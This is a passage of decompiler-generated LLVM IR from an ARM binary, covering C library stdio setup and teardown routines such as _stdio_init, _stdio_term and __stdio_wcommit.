  %v2_ffc0 = icmp eq i32 %v1_ffc0, 0
  store i1 %v2_ffc0, i1* %cpsr_z.global-to-local, align 1
  %v0_ffc4 = load i32, i32* @r8, align 4
  %v1_ffc4 = add i32 %v0_ffc4, 1
  %v2_ffc4 = inttoptr i32 %v1_ffc4 to i8*
  %v3_ffc4 = load i8, i8* %v2_ffc4, align 1
  %v4_ffc4 = zext i8 %v3_ffc4 to i32
  %v1_ffc8 = inttoptr i32 %v0_ffc4 to i8*
  %v2_ffc8 = load i8, i8* %v1_ffc8, align 1
  %v3_ffc8 = zext i8 %v2_ffc8 to i32
  store i32 %v3_ffc8, i32* %r3.global-to-local, align 4
  br i1 %v2_ffc0, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_ffac
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_ffac, %bb35
  %v0_ffdc = phi i32 [ 0, %dec_label_pc_ffac ], [ 32768, %bb35 ]
  %v1_ffd0 = and i32 %v0_ffc0, 1024
  store i32 %v1_ffd0, i32* %r0.global-to-local, align 4
  %v4_ffd8 = mul nuw nsw i32 %v4_ffc4, 256
  %v5_ffd8 = or i32 %v3_ffc8, %v4_ffd8
  %v2_ffdc = or i32 %v0_ffdc, %v1_ffd0
  store i32 %v2_ffdc, i32* %r1.global-to-local, align 4
  %v2_ffe4 = or i32 %v5_ffd8, %v2_ffdc
  %v1_ffd4 = mul i32 %v0_ffc0, 16
  %v1_ffe0 = and i32 %v1_ffd4, 48
  %v1_ffe8 = add nuw nsw i32 %v1_ffe0, 16
  %v4_ffec = xor i32 %v1_ffe8, 48
  %v5_ffec = or i32 %v2_ffe4, %v4_ffec
  store i32 %v5_ffec, i32* %r3.global-to-local, align 4
  %v3_fff019 = udiv i32 %v2_ffe4, 256
  store i32 %v3_fff019, i32* %r2.global-to-local, align 4
  %v1_fff4 = trunc i32 %v3_fff019 to i8
  store i8 %v1_fff4, i8* %v2_ffc4, align 1
  %v0_fff8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fff8 = trunc i32 %v0_fff8 to i8
  %v2_fff8 = load i32, i32* @r8, align 4
  %v3_fff8 = inttoptr i32 %v2_fff8 to i8*
  store i8 %v1_fff8, i8* %v3_fff8, align 1
  %v0_fffc = call i32 @__errno_location()
  store i32 %v0_fffc, i32* %r0.global-to-local, align 4
  %v0_10000 = load i32, i32* @r8, align 4
  %v1_10000 = add i32 %v0_10000, 1
  %v2_10000 = inttoptr i32 %v1_10000 to i8*
  %v3_10000 = load i8, i8* %v2_10000, align 1
  %v4_10000 = zext i8 %v3_10000 to i32
  store i32 %v4_10000, i32* %r3.global-to-local, align 4
  %v1_10004 = inttoptr i32 %v0_10000 to i8*
  %v2_10004 = load i8, i8* %v1_10004, align 1
  %v3_10004 = zext i8 %v2_10004 to i32
  store i32 %v0_fffc, i32* @r6, align 4
  %v1_1000c = add i32 %v0_10000, 4
  %v2_1000c = inttoptr i32 %v1_1000c to i32*
  %v3_1000c = load i32, i32* %v2_1000c, align 4
  store i32 %v3_1000c, i32* @r0, align 4
  %v4_10010 = mul nuw nsw i32 %v4_10000, 256
  %v5_10010 = or i32 %v3_10004, %v4_10010
  store i32 %v5_10010, i32* @r4, align 4
  %v1_10014 = inttoptr i32 %v0_fffc to i32*
  %v2_10014 = load i32, i32* %v1_10014, align 4
  store i32 %v2_10014, i32* @r5, align 4
  %v1_10018 = call i32 @isatty(i32 %v3_1000c)
  store i32 %v1_10018, i32* %r0.global-to-local, align 4
  %v0_1001c = load i32, i32* @r4, align 4
  %v4_1001c = mul i32 %v1_10018, 256
  %v5_1001c = or i32 %v0_1001c, %v4_1001c
  store i32 %v5_1001c, i32* @r4, align 4
  %v3_10020 = sdiv i32 %v5_1001c, 256
  store i32 %v3_10020, i32* %r3.global-to-local, align 4
  %v1_10024 = trunc i32 %v3_10020 to i8
  %v2_10024 = load i32, i32* @r8, align 4
  %v3_10024 = add i32 %v2_10024, 1
  %v4_10024 = inttoptr i32 %v3_10024 to i8*
  store i8 %v1_10024, i8* %v4_10024, align 1
  %v0_10028 = load i32, i32* @r4, align 4
  %v1_10028 = trunc i32 %v0_10028 to i8
  %v2_10028 = load i32, i32* @r8, align 4
  %v3_10028 = inttoptr i32 %v2_10028 to i8*
  store i8 %v1_10028, i8* %v3_10028, align 1
  %v0_1002c = load i32, i32* @r5, align 4
  %v1_1002c = load i32, i32* @r6, align 4
  %v2_1002c = inttoptr i32 %v1_1002c to i32*
  store i32 %v0_1002c, i32* %v2_1002c, align 4
  %v0_10030 = load i32, i32* @r8, align 4
  %v1_10030 = add i32 %v0_10030, 8
  %v2_10030 = inttoptr i32 %v1_10030 to i32*
  %v3_10030 = load i32, i32* %v2_10030, align 4
  store i32 %v3_10030, i32* %r3.global-to-local, align 4
  %v2_10034 = icmp eq i32 %v3_10030, 0
  store i1 %v2_10034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10034, label %dec_label_pc_1003c, label %bb37

dec_label_pc_1003c:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_10040 = call i32 @malloc(i32 4096)
  store i32 %v1_10040, i32* %r0.global-to-local, align 4
  %v2_10044 = icmp eq i32 %v1_10040, 0
  store i1 %v2_10044, i1* %cpsr_z.global-to-local, align 1
  %v1_10058.pre = load i32, i32* @r8, align 4
  br i1 %v2_10044, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_1003c
  %v2_1005820 = add i32 %v1_10058.pre, 8
  %v3_1005821 = inttoptr i32 %v2_1005820 to i32*
  store i32 0, i32* %v3_1005821, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_1003c
  %v2_10048 = inttoptr i32 %v1_10058.pre to i32*
  %v3_10048 = load i32, i32* %v2_10048, align 4
  %v2_1004c = or i32 %v3_10048, 16384
  store i32 %v2_1004c, i32* %r3.global-to-local, align 4
  %v2_10050 = add i32 %v1_10040, 4096
  store i32 %v2_10050, i32* %r2.global-to-local, align 4
  %v4_10054 = sdiv i32 %v2_1004c, 256
  store i32 %v4_10054, i32* %r1.global-to-local, align 4
  %v2_10058 = add i32 %v1_10058.pre, 8
  %v3_10058 = inttoptr i32 %v2_10058 to i32*
  store i32 %v1_10040, i32* %v3_10058, align 4
  %v1_1005c = load i32, i32* %r2.global-to-local, align 4
  %v2_1005c = load i32, i32* @r8, align 4
  %v3_1005c = add i32 %v2_1005c, 12
  %v4_1005c = inttoptr i32 %v3_1005c to i32*
  store i32 %v1_1005c, i32* %v4_1005c, align 4
  %v1_10060 = load i32, i32* %r1.global-to-local, align 4
  %v2_10060 = trunc i32 %v1_10060 to i8
  %v3_10060 = load i32, i32* @r8, align 4
  %v4_10060 = add i32 %v3_10060, 1
  %v5_10060 = inttoptr i32 %v4_10060 to i8*
  store i8 %v2_10060, i8* %v5_10060, align 1
  %v0_10064.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10064.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_10064 = load i32, i32* %r3.global-to-local, align 4
  %v2_10064 = trunc i32 %v1_10064 to i8
  %v3_10064 = load i32, i32* @r8, align 4
  %v4_10064 = inttoptr i32 %v3_10064 to i8*
  store i8 %v2_10064, i8* %v4_10064, align 1
  %v0_10068.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10068.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_10068 = load i32, i32* @r8, align 4
  %v3_10068 = add i32 %v2_10068, 12
  %v4_10068 = inttoptr i32 %v3_10068 to i32*
  store i32 %v1_10040, i32* %v4_10068, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23800.608 to i32), i32* %r3.global-to-local, align 4
  %v2_10074 = load i32, i32* @r8, align 4
  %v3_10074 = add i32 %v2_10074, 2
  %v4_10074 = inttoptr i32 %v3_10074 to i8*
  store i8 0, i8* %v4_10074, align 1
  %v0_10078 = load i32, i32* @r8, align 4
  %v1_10078 = add i32 %v0_10078, 1
  %v2_10078 = inttoptr i32 %v1_10078 to i8*
  %v3_10078 = load i8, i8* %v2_10078, align 1
  %v4_10078 = zext i8 %v3_10078 to i32
  store i32 %v4_10078, i32* %r2.global-to-local, align 4
  %v2_1007c = load i32, i32* @global_var_23800.608, align 4
  store i32 %v2_1007c, i32* %r1.global-to-local, align 4
  %v1_10080 = add i32 %v0_10078, 8
  %v2_10080 = inttoptr i32 %v1_10080 to i32*
  %v3_10080 = load i32, i32* %v2_10080, align 4
  store i32 %v3_10080, i32* %r3.global-to-local, align 4
  %v1_10084 = and i32 %v4_10078, 32
  %v2_10084 = icmp eq i32 %v1_10084, 0
  store i1 %v2_10084, i1* %cpsr_z.global-to-local, align 1
  %v2_10088 = add i32 %v0_10078, 20
  %v3_10088 = inttoptr i32 %v2_10088 to i32*
  store i32 %v3_10080, i32* %v3_10088, align 4
  %v0_1008c = load i32, i32* %r0.global-to-local, align 4
  %v1_1008c = load i32, i32* @r8, align 4
  %v2_1008c = add i32 %v1_1008c, 44
  %v3_1008c = inttoptr i32 %v2_1008c to i32*
  store i32 %v0_1008c, i32* %v3_1008c, align 4
  %v0_10090 = load i32, i32* %r1.global-to-local, align 4
  %v1_10090 = load i32, i32* @r8, align 4
  %v2_10090 = add i32 %v1_10090, 52
  %v3_10090 = inttoptr i32 %v2_10090 to i32*
  store i32 %v0_10090, i32* %v3_10090, align 4
  %v0_10094 = load i32, i32* %r3.global-to-local, align 4
  %v1_10094 = load i32, i32* @r8, align 4
  %v2_10094 = add i32 %v1_10094, 24
  %v3_10094 = inttoptr i32 %v2_10094 to i32*
  store i32 %v0_10094, i32* %v3_10094, align 4
  %v0_10098 = load i32, i32* %r3.global-to-local, align 4
  %v1_10098 = load i32, i32* @r8, align 4
  %v2_10098 = add i32 %v1_10098, 28
  %v3_10098 = inttoptr i32 %v2_10098 to i32*
  store i32 %v0_10098, i32* %v3_10098, align 4
  %v0_1009c = load i32, i32* %r3.global-to-local, align 4
  %v1_1009c = load i32, i32* @r8, align 4
  %v2_1009c = add i32 %v1_1009c, 16
  %v3_1009c = inttoptr i32 %v2_1009c to i32*
  store i32 %v0_1009c, i32* %v3_1009c, align 4
  br i1 %v2_10084, label %dec_label_pc_10130, label %dec_label_pc_100a4

dec_label_pc_100a4:                               ; preds = %bb37
  %v2_100a4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100a4, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_237e8.595 to i32), i32* %r2.global-to-local, align 4
  %v1_100bc = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_237e8.595 to i32), i32* %r0.global-to-local, align 4
  %v1_100cc = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_237d0.614 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_fe80, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r1.global-to-local, align 4
  %v1_100e0 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_237d0.614 to i32), i32* %r0.global-to-local, align 4
  %v1_100ec = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_237cc.617 to i32), i32* %r2.global-to-local, align 4
  %v2_100f4 = load i32, i32* bitcast (i32** @global_var_237cc.617 to i32*), align 4
  store i32 %v2_100f4, i32* %r3.global-to-local, align 4
  store i32 %v2_fe80, i32* @r0, align 4
  %v1_100fc = load i32, i32* @r8, align 4
  %v2_100fc = add i32 %v1_100fc, 32
  %v3_100fc = inttoptr i32 %v2_100fc to i32*
  store i32 %v2_100f4, i32* %v3_100fc, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_10108 = load i32, i32* @r8, align 4
  %v1_10108 = load i32, i32* %r2.global-to-local, align 4
  %v2_10108 = inttoptr i32 %v1_10108 to i32*
  store i32 %v0_10108, i32* %v2_10108, align 4
  %v1_10110 = call i32 @__pthread_return_void()
  store i32 %v2_100a4, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 65832, i32* @lr, align 4
  %v1_10124 = call i32 @__pthread_return_void()
  store i32 %v1_10124, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10130

dec_label_pc_1012c:                               ; preds = %dec_label_pc_fec0, %dec_label_pc_feac, %dec_label_pc_fecc
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10130

dec_label_pc_10130:                               ; preds = %bb37, %dec_label_pc_ff04, %dec_label_pc_100a4, %dec_label_pc_1012c
  %v0_10130 = load i32, i32* @r8, align 4
  store i32 %v0_10130, i32* %r0.global-to-local, align 4
  %v2_10138 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10138, i32* @r4, align 4
  store i32 %v6_fe74, i32* @r5, align 4
  store i32 %v9_fe74, i32* @r6, align 4
  store i32 %v15_fe74, i32* @r8, align 4
  ret i32 %v0_10130

; uselistorder directives
  uselistorder i32 %v1_10058.pre, { 1, 0, 2 }
  uselistorder i32 %v3_10020, { 1, 0 }
  uselistorder i32 %v3_ffb41, { 1, 0 }
  uselistorder i32 %v0_ff94, { 1, 0 }
  uselistorder i1 %v7_ff88, { 1, 0 }
  uselistorder i32 %v1_ff58, { 1, 0 }
  uselistorder i32 %v0_ff58, { 1, 0 }
  uselistorder i32 %v1_ff40, { 1, 0, 2 }
  uselistorder i32 %v1_fef4, { 1, 0 }
  uselistorder i1 %v7_fea0, { 1, 0 }
  uselistorder i1 %v7_fe94, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 9, 10, 8, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_10130, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1012c, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_ff88._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ff30, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_fedc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_feac, { 1, 2, 0 }
}

define i32 @"$d.2"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1013c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1013c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1013c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1013c
  %v3_10144 = and i32 %arg4, %arg3
  store i32 %v3_10144, i32* %r0.global-to-local, align 4
  %v2_10148 = trunc i32 %v3_10144 to i16
  %v4_10148 = inttoptr i32 %v3_10144 to i16*
  store i16 %v2_10148, i16* %v4_10148, align 2
  %v5_10148 = load i32, i32* @r6, align 4
  %v6_10148 = load i32, i32* %r0.global-to-local, align 4
  %v7_10148 = sub i32 %v6_10148, %v5_10148
  store i32 %v7_10148, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1013c, %bb
  %v8_10148 = phi i32 [ %tmp, %dec_label_pc_1013c ], [ %v7_10148, %bb ]
  ret i32 %v8_10148

; uselistorder directives
  uselistorder i32 %v3_10144, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1016c = load i32, i32* @r4, align 4
  store i32 %v3_1016c, i32* %stack_var_-24, align 4
  %v9_1016c = load i32, i32* @r6, align 4
  %v0_10170 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_23804.584 to i32), i32* @r4, align 4
  %v3_10178 = load i8, i8* @global_var_23805.620, align 1
  %v4_10178 = zext i8 %v3_10178 to i32
  %v2_1017c = load i8, i8* bitcast (i8** @global_var_23804.584 to i8*), align 4
  %v3_1017c = zext i8 %v2_1017c to i32
  store i32 %v0_10170, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_10188 = mul nuw nsw i32 %v4_10178, 256
  %v5_10188 = or i32 %v3_1017c, %v4_10188
  store i32 %v5_10188, i32* @r6, align 4
  %v1_1018c = inttoptr i32 %v0_10170 to i32*
  %v2_1018c = load i32, i32* %v1_1018c, align 4
  store i32 %v2_1018c, i32* %r8.global-to-local, align 4
  %v1_10190 = call i32 @isatty(i32 0)
  %v1_10194 = sub i32 1, %v1_10190
  %v0_10198 = load i32, i32* @r6, align 4
  %v4_10198 = mul i32 %v1_10194, 256
  %v5_10198 = xor i32 %v4_10198, %v0_10198
  %v3_1019c = load i8, i8* @global_var_23855.621, align 1
  %v4_1019c = zext i8 %v3_1019c to i32
  %v3_101a0 = load i8, i8* @global_var_23854.585, align 1
  %v4_101a0 = zext i8 %v3_101a0 to i32
  %v3_101a4 = sdiv i32 %v5_10198, 256
  store i32 1, i32* @r0, align 4
  %v4_101ac = mul nuw nsw i32 %v4_1019c, 256
  %v5_101ac = or i32 %v4_101a0, %v4_101ac
  store i32 %v5_101ac, i32* @r5, align 4
  %v1_101b0 = trunc i32 %v3_101a4 to i8
  store i8 %v1_101b0, i8* @global_var_23805.620, align 1
  %v1_101b4 = trunc i32 %v0_10198 to i8
  %v2_101b4 = load i32, i32* @r4, align 4
  %v3_101b4 = inttoptr i32 %v2_101b4 to i8*
  store i8 %v1_101b4, i8* %v3_101b4, align 1
  %v1_101b8 = call i32 @isatty(i32 1)
  %v1_101bc = sub i32 1, %v1_101b8
  %v0_101c0 = load i32, i32* @r5, align 4
  %v4_101c0 = mul i32 %v1_101bc, 256
  %v5_101c0 = xor i32 %v4_101c0, %v0_101c0
  store i32 %v5_101c0, i32* %r5.global-to-local, align 4
  %v3_101c4 = sdiv i32 %v5_101c0, 256
  %v1_101c8 = trunc i32 %v3_101c4 to i8
  store i8 %v1_101c8, i8* @global_var_23855.621, align 1
  %v0_101cc = load i32, i32* %r8.global-to-local, align 4
  %v1_101cc = load i32, i32* @r7, align 4
  %v2_101cc = inttoptr i32 %v1_101cc to i32*
  store i32 %v0_101cc, i32* %v2_101cc, align 4
  %v0_101d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_101d0 = trunc i32 %v0_101d0 to i8
  store i8 %v1_101d0, i8* @global_var_23854.585, align 1
  %v2_101d4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_101d4, i32* @r4, align 4
  store i32 %v9_1016c, i32* @r6, align 4
  ret i32 %v1_101bc

; uselistorder directives
  uselistorder i32 %v1_101bc, { 1, 0 }
  uselistorder i32 %v0_10198, { 1, 0 }
  uselistorder i8* @global_var_23854.585, { 1, 0 }
  uselistorder i8* @global_var_23855.621, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_23805.620, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1a08c.623 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_101e4 = call i32 @memcpy()
  %v0_101e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_101e8, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_101e8 = load i32, i32* @r1, align 4
  %v2_101e8 = load i32, i32* @ip, align 4
  %v4_101e8 = mul i32 %v2_101e8, 2
  %v5_101e8 = and i32 %v4_101e8, %v1_101e8
  store i32 %v5_101e8, i32* @sl, align 4
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_101e4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_101ec = load i32, i32* @r4, align 4
  store i32 %v3_101ec, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_237d0.614 to i32), i32* @r0, align 4
  %v0_101f4 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_237e8.595 to i32), i32* @r0, align 4
  %v0_101fc = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_237cc.617 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_237cc.617 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_102586 = add i32 %storemerge5, 56
  store i32 %v1_102586, i32* @r5, align 4
  %v2_1025c8 = icmp eq i32 %storemerge5, 0
  store i32 %v1_102586, i32* %r0.global-to-local, align 4
  br i1 %v2_1025c8, label %dec_label_pc_10268, label %dec_label_pc_1020c

dec_label_pc_1020c:                               ; preds = %entry, %dec_label_pc_10248
  store i32 ptrtoint (i8* @global_var_137d4.591 to i32), i32* %r3.global-to-local, align 4
  store i32 66072, i32* @lr, align 4
  %v1_10214 = call i32 @__pthread_return_0()
  %v2_10218 = icmp eq i32 %v1_10214, 0
  %v0_1021c = load i32, i32* @r5, align 4
  store i32 %v0_1021c, i32* @r0, align 4
  br i1 %v2_10218, label %dec_label_pc_10248, label %dec_label_pc_10224

dec_label_pc_10224:                               ; preds = %dec_label_pc_1020c
  %v0_10224 = load i32, i32* @r4, align 4
  %v1_10224 = add i32 %v0_10224, 8
  %v2_10224 = inttoptr i32 %v1_10224 to i32*
  %v3_10224 = load i32, i32* %v2_10224, align 4
  store i32 %v3_10224, i32* %r3.global-to-local, align 4
  %v3_1022c = inttoptr i32 %v0_10224 to i8*
  store i8 48, i8* %v3_1022c, align 1
  %v2_10234 = load i32, i32* @r4, align 4
  %v3_10234 = add i32 %v2_10234, 1
  %v4_10234 = inttoptr i32 %v3_10234 to i8*
  store i8 0, i8* %v4_10234, align 1
  %v0_10238 = load i32, i32* %r3.global-to-local, align 4
  %v1_10238 = load i32, i32* @r4, align 4
  %v2_10238 = add i32 %v1_10238, 20
  %v3_10238 = inttoptr i32 %v2_10238 to i32*
  store i32 %v0_10238, i32* %v3_10238, align 4
  %v0_1023c = load i32, i32* %r3.global-to-local, align 4
  %v1_1023c = load i32, i32* @r4, align 4
  %v2_1023c = add i32 %v1_1023c, 24
  %v3_1023c = inttoptr i32 %v2_1023c to i32*
  store i32 %v0_1023c, i32* %v3_1023c, align 4
  %v0_10240 = load i32, i32* %r3.global-to-local, align 4
  %v1_10240 = load i32, i32* @r4, align 4
  %v2_10240 = add i32 %v1_10240, 28
  %v3_10240 = inttoptr i32 %v2_10240 to i32*
  store i32 %v0_10240, i32* %v3_10240, align 4
  %v0_10244 = load i32, i32* %r3.global-to-local, align 4
  %v1_10244 = load i32, i32* @r4, align 4
  %v2_10244 = add i32 %v1_10244, 16
  %v3_10244 = inttoptr i32 %v2_10244 to i32*
  store i32 %v0_10244, i32* %v3_10244, align 4
  br label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %dec_label_pc_1020c, %dec_label_pc_10224
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_1024c = load i32, i32* @r4, align 4
  %v2_1024c = add i32 %v1_1024c, 52
  %v3_1024c = inttoptr i32 %v2_1024c to i32*
  store i32 1, i32* %v3_1024c, align 4
  %v0_10250 = call i32 @__stdio_init_mutex()
  store i32 %v0_10250, i32* %r0.global-to-local, align 4
  %v0_10254 = load i32, i32* @r4, align 4
  %v1_10254 = add i32 %v0_10254, 32
  %v2_10254 = inttoptr i32 %v1_10254 to i32*
  %storemerge = load i32, i32* %v2_10254, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v1_10258 = add i32 %storemerge, 56
  store i32 %v1_10258, i32* @r5, align 4
  %v2_1025c = icmp eq i32 %storemerge, 0
  store i32 %v1_10258, i32* %r0.global-to-local, align 4
  br i1 %v2_1025c, label %dec_label_pc_10258.dec_label_pc_10268_crit_edge, label %dec_label_pc_1020c

dec_label_pc_10258.dec_label_pc_10268_crit_edge:  ; preds = %dec_label_pc_10248
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_237cc.617 to i32*), align 4
  br label %dec_label_pc_10268

dec_label_pc_10268:                               ; preds = %dec_label_pc_10258.dec_label_pc_10268_crit_edge, %entry
  %v11_1029013 = phi i32 [ %v1_10258, %dec_label_pc_10258.dec_label_pc_10268_crit_edge ], [ %v1_102586, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_10258.dec_label_pc_10268_crit_edge ], [ 0, %entry ]
  store i32 ptrtoint (i32** @global_var_237cc.617 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_102884 = icmp eq i32 %storemerge12, 0
  br i1 %v2_102884, label %dec_label_pc_10290, label %dec_label_pc_10274

dec_label_pc_10274:                               ; preds = %dec_label_pc_10268, %dec_label_pc_10274
  %v0_1027c = phi i32 [ %storemerge1, %dec_label_pc_10274 ], [ %storemerge12, %dec_label_pc_10268 ]
  %v1_10274 = inttoptr i32 %v0_1027c to i8*
  %v2_10274 = load i8, i8* %v1_10274, align 1
  %v3_10274 = zext i8 %v2_10274 to i32
  store i32 %v3_10274, i32* %r3.global-to-local, align 4
  %v1_10278 = and i32 %v3_10274, 64
  store i32 %v0_1027c, i32* %r0.global-to-local, align 4
  store i32 66180, i32* @lr, align 4
  %v1_10280 = icmp ne i32 %v1_10278, 0
  call void @__pseudo_cond_branch(i1 %v1_10280, i32 ptrtoint (i32* @global_var_102a4.628 to i32))
  %v0_10284 = load i32, i32* %r4.global-to-local, align 4
  %v1_10284 = add i32 %v0_10284, 32
  %v2_10284 = inttoptr i32 %v1_10284 to i32*
  %storemerge1 = load i32, i32* %v2_10284, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_10288 = icmp eq i32 %storemerge1, 0
  br i1 %v2_10288, label %dec_label_pc_10288.dec_label_pc_10290_crit_edge, label %dec_label_pc_10274

dec_label_pc_10288.dec_label_pc_10290_crit_edge:  ; preds = %dec_label_pc_10274
  %v11_10290.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10290

dec_label_pc_10290:                               ; preds = %dec_label_pc_10288.dec_label_pc_10290_crit_edge, %dec_label_pc_10268
  %v11_10290 = phi i32 [ %v11_10290.pre, %dec_label_pc_10288.dec_label_pc_10290_crit_edge ], [ %v11_1029013, %dec_label_pc_10268 ]
  %v2_10290 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10290, i32* @r4, align 4
  ret i32 %v11_10290

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10274, { 1, 0 }
  uselistorder label %dec_label_pc_10248, { 1, 0 }
  uselistorder label %dec_label_pc_1020c, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102a4 = load i32, i32* @r4, align 4
  store i32 %v3_102a4, i32* %stack_var_-8, align 4
  %v0_102a8 = load i32, i32* @r0, align 4
  %v1_102a8 = add i32 %v0_102a8, 8
  %v2_102a8 = inttoptr i32 %v1_102a8 to i32*
  %v3_102a8 = load i32, i32* %v2_102a8, align 4
  %v1_102ac = add i32 %v0_102a8, 16
  %v2_102ac = inttoptr i32 %v1_102ac to i32*
  %v3_102ac = load i32, i32* %v2_102ac, align 4
  %v9_102b0 = icmp eq i32 %v3_102ac, %v3_102a8
  store i32 %v0_102a8, i32* %r4.global-to-local, align 4
  br i1 %v9_102b0, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_102a8, i32* %v2_102ac, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 66244, i32* @lr, align 4
  %v1_102c0 = xor i1 %v9_102b0, true
  call void @__pseudo_cond_branch(i1 %v1_102c0, i32 ptrtoint (i32* @global_var_13eb8.629 to i32))
  %v0_102c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_102c4 = add i32 %v0_102c4, 8
  %v2_102c4 = inttoptr i32 %v1_102c4 to i32*
  %v3_102c4 = load i32, i32* %v2_102c4, align 4
  %v1_102c8 = add i32 %v0_102c4, 16
  %v2_102c8 = inttoptr i32 %v1_102c8 to i32*
  %v3_102c8 = load i32, i32* %v2_102c8, align 4
  %v2_102cc = sub i32 %v3_102c8, %v3_102c4
  %v2_102d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_102d0, i32* @r4, align 4
